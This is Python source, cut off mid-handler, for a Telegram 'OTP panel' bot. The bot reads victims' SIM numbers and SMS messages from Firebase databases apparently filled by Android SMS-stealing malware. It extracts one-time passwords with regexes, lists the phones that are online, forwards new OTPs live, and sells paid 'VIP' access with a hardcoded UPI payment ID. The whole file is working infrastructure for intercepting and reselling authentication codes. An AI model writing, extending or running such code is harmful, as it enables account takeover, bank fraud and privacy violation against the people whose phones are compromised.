#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════
    OTP PANEL BOT — CONFIGURABLE EDITION
    (Add Databases via Admin Panel | 24/7 Ready)
══════════════════════════════════════════════════════
"""

import os
import re
import time
import json
import asyncio
import logging
from datetime import datetime
from typing import Optional, List, Set

import aiohttp
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, 
    InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton,
    LinkPreviewOptions
)
from aiogram.filters import Command, CommandObject
from aiogram.exceptions import TelegramBadRequest
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ============================================================
# ENVIRONMENT VARIABLES (Render / Koyeb / VPS Hosting)
# ============================================================

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS_STR = os.getenv("ADMIN_IDS", "7194867487,5947360149")
REQUIRED_CHANNELS_STR = os.getenv("REQUIRED_CHANNELS", "Cybers_chater")
UPI_ID = os.getenv("UPI_ID", "anand.abhishek.deal@fam")
MERCHANT_NAME = os.getenv("MERCHANT_NAME", "Cyber Panel PRO")
BOT_USERNAME = os.getenv("BOT_USERNAME", "Cyber_pannel_bot")
PORT = int(os.getenv("PORT", 8080))  # For health check endpoint

# Parse Admin IDs (Multiple admins supported)
ADMIN_IDS: Set[int] = set()
for admin_id in ADMIN_IDS_STR.split(","):
    admin_id = admin_id.strip()
    if admin_id.isdigit():
        ADMIN_IDS.add(int(admin_id))

# Parse Required Channels
REQUIRED_CHANNELS = []
for channel in REQUIRED_CHANNELS_STR.split(","):
    channel = channel.strip()
    if channel:
        REQUIRED_CHANNELS.append({
            "username": channel,
            "url": f"https://t.me/{channel}",
            "name": channel.replace("_", " ").title()
        })

# ============================================================
# DATABASES - Will be managed via Admin Panel
# ============================================================

DATABASES = {}  # Empty initially - Add via Admin Panel

# ============================================================
# BOT CONFIGURATION
# ============================================================

POLL_INTERVAL = 0.1  # 100ms for fast response
SMS_LIMIT = 15
DB_FILE = "bot_database.json"

VIP_PLANS = {
    "2hr": {"name": "2 Hours Access", "price": 49, "duration": 2 * 3600},
    "1day": {"name": "1 Day Access", "price": 129, "duration": 24 * 3600},
    "1week": {"name": "1 Week Access", "price": 299, "duration": 7 * 24 * 3600},
}

# ============================================================
# GLOBAL VARIABLES
# ============================================================

seen_ids: Set[str] = set()
first_run: bool = True
_main_bot: Optional[Bot] = None
_http_session: Optional[aiohttp.ClientSession] = None

all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_focus: dict[str, dict[int, str]] = {}
chats_registry: dict[str, set[int]] = {}

CLONES: dict[str, dict] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}
DEVICE_LAST_SMS_TIME: dict[str, float] = {}

dp = Dispatcher()

# ============================================================
# LOGGING
# ============================================================

logging.basicConfig(
    format="%(asctime)s — %(name)s — %(levelname)s — %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

def tlog(msg: str) -> None:
    t = datetime.now().strftime("%I:%M:%S %p")
    print(f"[{t}]  {msg}", flush=True)

# ============================================================
# DATABASE FUNCTIONS
# ============================================================

def _sync_save_data():
    try:
        data_to_dump = {
            "all_users": all_users,
            "DATABASES": DATABASES,
            "CLONES": CLONES
        }
        with open(DB_FILE, "w", encoding="utf-8") as f:
            json.dump(data_to_dump, f, indent=4)
    except Exception as e:
        tlog(f"Save Data Error: {e}")

async def save_data_async():
    await asyncio.to_thread(_sync_save_data)

def load_data():
    global all_users, CLONES, DATABASES
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            loaded_users = data.get("all_users", {})
            for k, v in loaded_users.items():
                all_users[int(k)] = v
            loaded_dbs = data.get("DATABASES", {})
            if loaded_dbs and isinstance(loaded_dbs, dict):
                DATABASES.update(loaded_dbs)
            CLONES.update(data.get("CLONES", {}))
            tlog(f"✅ Data Loaded: {len(all_users)} users, {len(DATABASES)} databases")
        except Exception as e:
            tlog(f"Load Data Error: {e}")

async def auto_save_loop():
    while True:
        await asyncio.sleep(60)  # Save every minute
        await save_data_async()

# ============================================================
# HEALTH CHECK FOR 24/7 MONITORING
# ============================================================

async def health_check():
    """Simple HTTP server for health checks (keeps bot alive on Render/Koyeb)"""
    try:
        from aiohttp import web
        
        async def handle(request):
            return web.Response(text="OK")
        
        app = web.Application()
        app.router.add_get('/', handle)
        app.router.add_get('/health', handle)
        
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', PORT)
        await site.start()
        tlog(f"✅ Health check server running on port {PORT}")
        
        # Keep the server running
        while True:
            await asyncio.sleep(3600)
    except ImportError:
        tlog("⚠️ aiohttp.web not available, health check disabled")
    except Exception as e:
        tlog(f"Health check error: {e}")

# ============================================================
# HELPERS
# ============================================================

def is_vip(bot_token: str, user_id: int) -> bool:
    if bot_token == BOT_TOKEN and user_id in ADMIN_IDS:
        return True
    users_db = all_users if bot_token == BOT_TOKEN else CLONES.get(bot_token, {}).get("users", {})
    user_data = users_db.get(user_id, {})
    vip_until = user_data.get("vip_until", 0.0)
    return time.time() < vip_until

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=2000, keepalive_timeout=30)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
        if not path: 
            url = url.replace("?shallow=true", ".json")
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as r:
            if r.status != 200: 
                return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except Exception:
        return None

async def fb_keys(path: str, base: str) -> List[str]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as r:
            if r.status != 200: 
                return []
            data = await r.json(content_type=None)
            return list(data.keys()) if isinstance(data, dict) else []
    except Exception:
        return []

async def check_membership(bot: Bot, user_id: int) -> List[str]:
    not_joined = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=f"@{ch['username']}", user_id=user_id)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch["username"])
        except Exception:
            not_joined.append(ch["username"])
    return not_joined

async def send_join_prompt(message: Message, bot: Bot) -> None:
    buttons = [[InlineKeyboardButton(text=f"📢 Join {ch['name']}", url=ch["url"])] for ch in REQUIRED_CHANNELS]
    buttons.append([InlineKeyboardButton(text="✅ I Have Joined — Check Now", callback_data="check_join")])
    text = "🔒 Verification Required\n\nTo use this bot, please join the channel below:\n\n"
    for ch in REQUIRED_CHANNELS: 
        text += f"• {ch['name']}: {ch['url']}\n"
    text += "\nAfter joining, click the 'Check Now' button."
    await message.reply(
        text, 
        reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), 
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )

# ============================================================
# DATA EXTRACTION
# ============================================================

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", str(n))
    if c.startswith("91") and len(c) == 12: 
        c = c[2:]
    return c if len(c) > 4 else c

def extract_numbers(data: dict) -> List[str]:
    if not isinstance(data, dict): 
        return []
    safe_keys = [
        "sim1Number", "sim2Number", "numberSim1", "numberSim2", 
        "mobNo", "mobileNo", "sim1", "sim2", "Sim1", "Sim2", 
        "sim1_num", "sim2_num", "Sim1Number", "Sim2Number"
    ]
    nums = []
    for k in safe_keys:
        val = str(data.get(k, ""))
        cleaned = fmt_num(val)
        if cleaned and len(cleaned) >= 5 and cleaned not in nums:
            if "92359530360" not in cleaned:
                nums.append(cleaned)
    return nums

def parse_status(val, timestamp=0) -> str:
    if isinstance(val, bool):
        if val: 
            return "online"
    elif isinstance(val, str):
        v = val.lower().strip()
        if v in ("online", "true", "active", "1", "yes"):
            return "online"
    elif isinstance(val, (int, float)):
        if val == 1: 
            return "online"

    if timestamp:
        try:
            ts = float(timestamp)
            if ts > 1e11: 
                ts /= 1000
            now = time.time()
            if (now - ts) < 900:  # 15 minutes
                return "online"
        except: 
            pass
    return "offline"

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): 
        return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: 
        return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: 
                ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: 
            pass
    return "N/A"

def parse_sms_timestamp(sms: dict) -> float:
    ts = sms.get("timestamp") or sms.get("time") or 0
    try:
        val = float(ts)
        if val > 1e11: 
            val /= 1000
        return val
    except:
        return time.time()

# ============================================================
# OTP EXTRACTION
# ============================================================

OTP_PATTERNS = [
    re.compile(r"OTP[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"code[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"password[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"\b(\d{6})\b"),
    re.compile(r"\b(\d{4})\b"),
]

def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(text)
        if m: 
            return m.group(1)
    return None

def seen_key(device_id: str, k: str) -> str:
    return f"{device_id}/{k}"

# ============================================================
# DEVICE CLASS
# ============================================================

PAGE_SIZE = 20

class Device:
    __slots__ = ("id", "name", "status", "battery", "timestamp", "numbers", "device_info", "sms_path", "base_url", "db_tag")
    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag):
        self.id = id
        self.name = name
        self.status = status
        self.battery = battery
        self.timestamp = timestamp
        self.numbers = numbers
        self.device_info = device_info
        self.sms_path = sms_path
        self.base_url = base_url
        self.db_tag = db_tag

def device_label(device: Device) -> str:
    if device.numbers: 
        return " & ".join(device.numbers)
    return f"{device.name}"

# ============================================================
# FIREBASE FETCH FUNCTIONS
# ============================================================

async def fetch_db_data(tag: str, url: str) -> List[Device]:
    devices_list = []
    added_set = set()
    try:
        sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
            fb_get("All_Users/simDetails", url),
            fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url),
            fb_get("clients", url),
        )
        
        sim_all = sim_all if isinstance(sim_all, dict) else {}
        device_info_all = device_info_all if isinstance(device_info_all, dict) else {}
        user_data_all = user_data_all if isinstance(user_data_all, dict) else {}
        clients_all = clients_all if isinstance(clients_all, dict) else {}

        all_dev_ids = set(sim_all.keys()) | set(device_info_all.keys()) | set(user_data_all.keys()) | set(clients_all.keys())

        for dev_id in all_dev_ids:
            if dev_id in added_set: 
                continue
            
            nums = []
            name = "Device"
            status_val = None
            battery = 0
            ts = 0
            sms_path = f"All_Users/sms/{dev_id}"
            device_info_text = f"Device ID: {dev_id}"

            if dev_id in user_data_all and isinstance(user_data_all[dev_id], dict):
                data = user_data_all[dev_id]
                nums.extend(extract_numbers(data))
                name = data.get("d_name") or data.get("model") or name
                status_val = data.get("status")
                battery = parse_battery(data.get("battery"))
                ts = int(data.get("timestamp") or data.get("currentTimeMillis") or data.get("time") or 0)
                device_info_text = data.get("Device_info") or f"Device ID: {dev_id}"
                sms_path = f"user_sms/{dev_id}"
                    
            info = device_info_all.get(dev_id, {})
            sim = sim_all.get(dev_id, {})
            
            if isinstance(sim, dict):
                nums.extend(extract_numbers(sim))
            if isinstance(info, dict):
                nums.extend(extract_numbers(info))
                if name == "Device":
                    name = info.get("DeviceModel") or info.get("Brand") or info.get("model") or name
                if status_val is None:
                    status_val = info.get("Status") or info.get("status")
                if battery == 0:
                    battery = parse_battery(info.get("Battery") or info.get("battery"))
                if ts == 0:
                    ts = int(info.get("currentTimeMillis") or info.get("timestamp") or info.get("time") or 0)
                if "Device ID" in device_info_text or len(device_info_text) < 15:
                    device_info_text = f"Model: {name}\nDevice ID: {dev_id}"
                        
            if dev_id in clients_all and isinstance(clients_all[dev_id], dict):
                client = clients_all[dev_id]
                nums.extend(extract_numbers(client))
                if name == "Device":
                    name = client.get("modelName") or client.get("model") or name
                if status_val is None:
                    status_val = client.get("status")
                if battery == 0:
                    battery = parse_battery(client.get("battery"))
                if ts == 0:
                    ts = int(client.get("timestamp") or client.get("time") or 0)

            unique_nums = []
            for num in nums:
                if num not in unique_nums:
                    unique_nums.append(num)

            final_status = parse_status(status_val, ts)
            
            added_set.add(dev_id)
            devices_list.append(Device(
                id=dev_id, name=name, status=final_status, battery=battery, timestamp=ts, 
                numbers=unique_nums, device_info=device_info_text, sms_path=sms_path, 
                base_url=url, db_tag=tag
            ))
    except Exception as e:
        pass
    return devices_list

async def get_all_devices(bot_token: str) -> List[Device]:
    dbs_to_check = list(DATABASES.keys())
    devices = [d for tag in dbs_to_check for d in GLOBAL_DEVICE_CACHE.get(tag, [])]
    unique_devices = {d.id: d for d in devices}
    dev_list = [d for d in unique_devices.values() if len(d.numbers) > 0]
    
    dev_list.sort(key=lambda d: (
        -DEVICE_LAST_SMS_TIME.get(d.id, 0.0), 
        0 if d.status == "online" else 1, 
        -d.timestamp
    ))
    return dev_list

async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> List[dict]:
    data = await fb_get(device.sms_path, device.base_url)
    if not data: 
        return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries[:limit]

# ============================================================
# KEYBOARD FUNCTIONS
# ============================================================

def get_reply_menu(is_admin: bool, bot_token: str, chat_id: int = 0) -> ReplyKeyboardMarkup:
    keys = [
        [KeyboardButton(text="🟢 Active Online"), KeyboardButton(text="📱 Devices List")],
        [KeyboardButton(text="🔍 Search Number"), KeyboardButton(text="🔑 Recent OTPs")],
        [KeyboardButton(text="👑 Buy VIP")],
        [KeyboardButton(text="👤 My Profile"), KeyboardButton(text="💸 Refer & Earn")]
    ]
    if is_admin: 
        keys.append([KeyboardButton(text="🛡 Admin Panel"), KeyboardButton(text="📊 Bot Status")])
    return ReplyKeyboardMarkup(keyboard=keys, resize_keyboard=True)

def device_list_keyboard(devices: List[Device], page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    page_devs = devices[page * PAGE_SIZE : (page + 1) * PAGE_SIZE]
    
    rows = []
    for d in page_devs:
        rows.append([InlineKeyboardButton(
            text=f"{'🟢' if d.status == 'online' else '🔴'} 📱 {' & '.join(d.numbers)}", 
            callback_data=f"sel:{d.id}"
        )])
        
    nav = []
    if page > 0: 
        nav.append(InlineKeyboardButton(text="◀️ Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(text=f"📄 {page + 1}/{total_pages}", callback_data="goto_page_prompt"))
    if page < total_pages - 1: 
        nav.append(InlineKeyboardButton(text="Next ▶️", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    
    rows.append([
        InlineKeyboardButton(text="🔄 Refresh List", callback_data="home"), 
        InlineKeyboardButton(text="❌ Close", callback_data="close_msg")
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def online_only_keyboard(devices: List[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online" and len(d.numbers) > 0]
    online.sort(key=lambda d: -DEVICE_LAST_SMS_TIME.get(d.id, 0.0))
    
    rows = [[InlineKeyboardButton(text=f"🟢 📱 {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")] for d in online[:50]]
    if not rows: 
        rows.append([InlineKeyboardButton(text="😴 No active online devices", callback_data="noop")])
    
    rows.append([
        InlineKeyboardButton(text="🔄 Refresh", callback_data="online"), 
        InlineKeyboardButton(text="📋 All Numbers", callback_data="pg:0")
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def device_action_keyboard(dev_id: str, numbers: List[str]) -> InlineKeyboardMarkup:
    buttons = [[InlineKeyboardButton(text=f"📱 Copy Number: {numbers[0]}", callback_data=f"cp:{numbers[0]}")]] if numbers else []
    buttons.extend([
        [InlineKeyboardButton(text="📩 View Last 2 SMS", callback_data=f"msgs:{dev_id}"), 
         InlineKeyboardButton(text="ℹ️ Device Info", callback_data=f"info:{dev_id}")],
        [InlineKeyboardButton(text="🔄 Refresh OTP", callback_data=f"msgs:{dev_id}")],
        [InlineKeyboardButton(text="🔙 Disconnect & Back", callback_data="home")]
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_keyboard() -> InlineKeyboardMarkup:
    keys = [
        [InlineKeyboardButton(text="📢 Broadcast", callback_data="admin_broadcast"), 
         InlineKeyboardButton(text="👥 User List", callback_data="admin_users")],
        [InlineKeyboardButton(text="➕ Add Firebase DB", callback_data="admin_add_firebase"), 
         InlineKeyboardButton(text="➖ Remove DB", callback_data="admin_remove_firebase")],
        [InlineKeyboardButton(text="📋 List All DBs", callback_data="admin_list_dbs")],
        [InlineKeyboardButton(text="🗑 Delete All DB", callback_data="admin_delete_all_db")],
        [InlineKeyboardButton(text="🔄 Refresh", callback_data="admin_refresh"), 
         InlineKeyboardButton(text="❌ Close", callback_data="close_msg")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=keys)

def get_vip_plan_keyboard() -> InlineKeyboardMarkup:
    btns = [
        [InlineKeyboardButton(text="⏱ 2 Hours Access — ₹49", callback_data="buy_vip:2hr")],
        [InlineKeyboardButton(text="📅 1 Day Access — ₹129", callback_data="buy_vip:1day")],
        [InlineKeyboardButton(text="🗓 1 Week Access — ₹299", callback_data="buy_vip:1week")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="close_msg")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=btns)

# ============================================================
# FORMATTING FUNCTIONS
# ============================================================

def format_sms_block(sms: dict, num_label: str) -> tuple[str, Optional[str]]:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    date = sms_date(sms)
    sender = sms.get("sender") or "Unknown"
    lines = [f"🔑 OTP: <code>{otp}</code>" if otp else "", 
             f"👤 From: {sender}\n📅 Date: {date}", 
             f"📱 Number/Device: {num_label}\n\n💬 Message: {body}"]
    return "\n".join([l for l in lines if l]), otp

def auto_forward_msg(sms: dict, num_label: str) -> str:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    date = sms_date(sms)
    sender = sms.get("sender") or "Unknown"
    if otp: 
        return f"✨ LIVE SCANNING: NEW OTP RECEIVED ✨\n━━━━━━━━━━━━━━━━━━\n│ 🔢 OTP : <code>{otp}</code>\n│ 📱 Number/Device : {num_label}\n│ 👤 From : {sender}\n│ 📅 Date : {date}\n━━━━━━━━━━━━━━━━━━\n💬 {body}"
    return f"📩 LIVE SCANNING: NEW SMS\n━━━━━━━━━━━━━━━━━━\n📱 Number/Device : {num_label}\n👤 From : {sender}\n📅 Date : {date}\n━━━━━━━━━━━━━━━━━━\n💬 {body}"

def device_list_header(devices: List[Device], page: int) -> str:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    total = len(devices)
    return f"📱 <b>DEVICE LIST ({total})</b>\n━━━━━━━━━━━━━━━━━━\nPage {page + 1}/{total_pages}\n🟢 Online | 🔴 Offline\n\nAll numbers are listed below. Select one!"

def admin_panel_text(bot_token: str) -> str:
    users_db = all_users if bot_token == BOT_TOKEN else CLONES[bot_token]["users"]
    total = len(users_db)
    verified = sum(1 for u in users_db.values() if u.get("verified"))
    unverified = total - verified
    total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
    active_chats = len(chats_registry.get(bot_token, set()))
    
    db_list = "\n".join([f"  • {name}" for name in DATABASES.keys()]) if DATABASES else "  ❌ No databases added"
    
    text = f"🛡 ADMIN PANEL\n━━━━━━━━━━━━━━━━━━\n👥 Total Users    : {total}\n✅ Verified Users : {verified}\n⏳ Unverified     : {unverified}\n📡 Active Chats   : {active_chats}\n🏆 Total OTP Views: {total_otps}\n🗄 Databases      : {len(DATABASES)}\n{db_list}\n"
    if bot_token == BOT_TOKEN: 
        text += f"🤖 Cloned Bots    : {len(CLONES)}\n"
    text += f"━━━━━━━━━━━━━━━━━━\n🕐 Updated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
    return text

async def send_vip_required_notice(message_or_query):
    txt = (
        "🚫 <b>ACCESS DENIED — VIP MEMBERSHIP REQUIRED</b>\n━━━━━━━━━━━━━━━━━━\n"
        "To access this bot, you need to purchase <b>VIP Access</b> first.\n\n"
        "Click the <b>👑 Buy VIP</b> button below and select your plan!"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="👑 Buy VIP Now", callback_data="open_buy_vip_plans")]])
    if isinstance(message_or_query, CallbackQuery):
        await message_or_query.message.reply(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    else:
        await message_or_query.reply(txt, reply_markup=kb, parse_mode=ParseMode.HTML)

async def safe_edit(query: CallbackQuery, text: str, reply_markup=None, parse_mode=ParseMode.HTML, disable_web_page_preview=False):
    try:
        if parse_mode == ParseMode.HTML: 
            text = text.replace("#", "&#35;")
        preview_opts = LinkPreviewOptions(is_disabled=disable_web_page_preview)
        await query.message.edit_text(text=text, reply_markup=reply_markup, parse_mode=parse_mode, link_preview_options=preview_opts)
    except TelegramBadRequest as e:
        if "message is not modified" not in str(e).lower():
            try: 
                await query.message.edit_text(text=text, reply_markup=reply_markup, parse_mode=None, link_preview_options=preview_opts)
            except: 
                pass

# ============================================================
# BOT COMMANDS
# ============================================================

@dp.message(Command("start"))
async def cmd_start(message: Message, command: CommandObject, bot: Bot) -> None:
    chat_id = message.chat.id
    user = message.from_user
    bot_token = bot.token
    is_main_bot = (bot_token == BOT_TOKEN)
    users_db = all_users if is_main_bot else CLONES[bot_token]["users"]
    is_admin = (chat_id in ADMIN_IDS) if is_main_bot else (chat_id == CLONES[bot_token]["creator"])

    if users_db.get(chat_id, {}).get("banned"):
        await message.reply("🚫 You are banned.", parse_mode=ParseMode.HTML)
        return

    args = command.args.split() if command.args else []
    ref_id = int(args[0]) if args and args[0].isdigit() else None
    
    if chat_id not in users_db:
        users_db[chat_id] = {
            "name": user.full_name if user else "Unknown",
            "username": user.username or "" if user else "",
            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
            "verified": False, "referrals": 0, "vip_until": 0.0,
            "otp_count": 0, "banned": False
        }

    if not users_db[chat_id].get("verified") and REQUIRED_CHANNELS:
        await send_join_prompt(message, bot)
        return

    chats_registry.setdefault(bot_token, set()).add(chat_id)
    await message.reply(
        "✨ OTP PANEL PRO EDITION ✨\n━━━━━━━━━━━━━━━━━━\nWelcome! Use the menu below:", 
        reply_markup=get_reply_menu(is_admin, bot_token, chat_id), 
        parse_mode=ParseMode.HTML
    )

@dp.message(Command("sendvip"))
async def cmd_sendvip(message: Message, command: CommandObject, bot: Bot) -> None:
    chat_id = message.chat.id
    bot_token = bot.token
    is_main_bot = (bot_token == BOT_TOKEN)
    is_admin = (chat_id in ADMIN_IDS) if is_main_bot else (chat_id == CLONES[bot_token]["creator"])
    users_db = all_users if is_main_bot else CLONES[bot_token]["users"]

    if not is_admin:
        await message.reply("🚫 This command is for Admins only.")
        return

    args = command.args.split() if command.args else []
    if not args or len(args) < 1:
        await message.reply("❌ Correct format:\n`/sendvip <chat_id> [days]` (Default: 1 Day)", parse_mode=ParseMode.HTML)
        return

    try:
        target_uid = int(args[0])
        days = int(args[1]) if len(args) > 1 and args[1].isdigit() else 1
        duration = days * 24 * 3600

        if target_uid not in users_db:
            users_db[target_uid] = {
                "name": "User", "username": "", "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
                "verified": True, "referrals": 0, "vip_until": 0.0, "otp_count": 0, "banned": False
            }

        curr_vip = users_db[target_uid].get("vip_until", time.time())
        start_time = max(time.time(), curr_vip)
        users_db[target_uid]["vip_until"] = start_time + duration
        await save_data_async()

        exp_date = datetime.fromtimestamp(users_db[target_uid]["vip_until"]).strftime("%d %b %Y %I:%M %p")

        await message.reply(f"✅ Success! User `<code>{target_uid}</code>` has been given {days} day(s) of VIP access.\nValid Until: {exp_date}", parse_mode=ParseMode.HTML)

        try:
            await bot.send_message(
                chat_id=target_uid,
                text=(
                    f"🎉 <b>VIP ACCESS UNLOCKED!</b> 🎉\n━━━━━━━━━━━━━━━━━━\n"
                    f"Your VIP access has been activated by admin!\n"
                    f"⏳ <b>Valid Until:</b> {exp_date}\n\n"
                    f"You can now use all bot features and live OTPs. Use /start menu."
                ),
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            await message.reply(f"⚠️ VIP activated in DB, but failed to message user: {e}")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")

# ============================================================
# CALLBACK QUERY HANDLER
# ============================================================

@dp.callback_query()
async def on_callback(query: CallbackQuery, bot: Bot) -> None:
    data = query.data or ""
    chat_id = query.message.chat.id
    bot_token = bot.token
    is_main_bot = (bot_token == BOT_TOKEN)
    users_db = all_users if is_main_bot else CLONES[bot_token]["users"]
    is_admin = (chat_id in ADMIN_IDS) if is_main_bot else (chat_id == CLONES[bot_token]["creator"])

    if data.startswith("cp:"):
        await query.answer("✅ Successfully Copied!")
        return

    await query.answer()
    try:
        if data == "noop": 
            return
        if data == "close_msg":
            try: 
                await query.message.delete()
            except: 
                pass
            return

        if data == "check_join":
            if await check_membership(bot, chat_id):
                await query.answer("❌ Please join the channel first!", show_alert=True)
                return
            users_db.setdefault(chat_id, {})["verified"] = True
            chats_registry.setdefault(bot_token, set()).add(chat_id)
            await query.message.delete()
            await bot.send_message(chat_id, "✅ Verification successful!", reply_markup=get_reply_menu(is_admin, bot_token, chat_id))
            return

        if data == "open_buy_vip_plans":
            txt = "👑 <b>CHOOSE YOUR VIP PLAN</b>\n━━━━━━━━━━━━━━━━━━\nSelect your VIP subscription plan:"
            await safe_edit(query, txt, reply_markup=get_vip_plan_keyboard())
            return

        if data.startswith("buy_vip:"):
            plan_key = data.split(":")[1]
            plan = VIP_PLANS.get(plan_key)
            if not plan: 
                return
            
            pending_action[chat_id] = {"action": "awaiting_payment_proof", "plan": plan_key}
            qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=upi://pay?pa={UPI_ID}%26pn={MERCHANT_NAME}%26am={plan['price']}%26cu=INR"
            
            caption = (
                f"💳 <b>PAYMENT CONFIRMATION — {MERCHANT_NAME}</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"📦 <b>Plan Selected:</b> {plan['name']}\n"
                f"💰 <b>Amount to Pay:</b> ₹{plan['price']}\n"
                f"🆔 <b>UPI ID:</b> <code>{UPI_ID}</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⚠️ <b>Instructions:</b>\n"
                f"1. Scan the QR code above or copy UPI ID and pay exactly <b>₹{plan['price']}</b>.\n"
                f"2. After successful payment, <b>send the screenshot here</b>.\n\n"
                f"Once admin verifies, your access will be activated! 🚀"
            )
            
            await query.message.delete()
            await bot.send_photo(
                chat_id=chat_id,
                photo=qr_url,
                caption=caption,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Cancel Payment", callback_data="close_msg")]])
            )
            return

        if data.startswith("vip_approve:"):
            if not is_admin: 
                await query.answer("🚫 You are not an admin!", show_alert=True)
                return
            
            parts = data.split(":")
            target_uid, plan_key = int(parts[1]), parts[2]
            plan = VIP_PLANS.get(plan_key)
            
            if target_uid not in users_db:
                users_db[target_uid] = {
                    "name": f"User_{target_uid}", "username": "", 
                    "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
                    "verified": True, "referrals": 0, "vip_until": 0.0, "otp_count": 0, "banned": False
                }
            
            if plan:
                curr_vip = users_db[target_uid].get("vip_until", 0.0)
                start_time = max(time.time(), curr_vip)
                users_db[target_uid]["vip_until"] = start_time + plan["duration"]
                
                await save_data_async()
                
                exp_date = datetime.fromtimestamp(users_db[target_uid]["vip_until"]).strftime("%d %b %Y %I:%M %p")
                
                await safe_edit(query, f"✅ <b>APPROVED!</b> User <code>{target_uid}</code> is now VIP until: {exp_date}")
                try:
                    await bot.send_message(
                        chat_id=target_uid,
                        text=(
                            f"🎉 <b>VIP ACCESS ACTIVATED!</b> 🎉\n━━━━━━━━━━━━━━━━━━\n"
                            f"Admin has approved your <b>{plan['name']}</b>!\n"
                            f"⏳ <b>Valid Until:</b> {exp_date}\n\n"
                            f"You can now access the Panel and Live OTPs. Use /start menu."
                        ),
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    tlog(f"Failed to notify user {target_uid}: {e}")
            else:
                await query.answer("❌ Error: Plan invalid!", show_alert=True)
            return

        if data.startswith("vip_reject:"):
            if not is_admin: 
                return
            target_uid = int(data.split(":")[1])
            await safe_edit(query, f"❌ <b>REJECTED!</b> Payment for user <code>{target_uid}</code> has been rejected.")
            try:
                await bot.send_message(
                    chat_id=target_uid,
                    text="❌ <b>Payment Rejected!</b>\n\nYour payment screenshot was not approved. Please send a proper screenshot or contact admin.",
                    parse_mode=ParseMode.HTML
                )
            except: 
                pass
            return

        if not is_vip(bot_token, chat_id):
            await send_vip_required_notice(query)
            return

        if data == "goto_page_prompt":
            pending_action[chat_id] = {"action": "goto_page"}
            await query.message.reply("📄 **Go to Page**\n\nWhich page number do you want to go to? Type the page number:")
            return

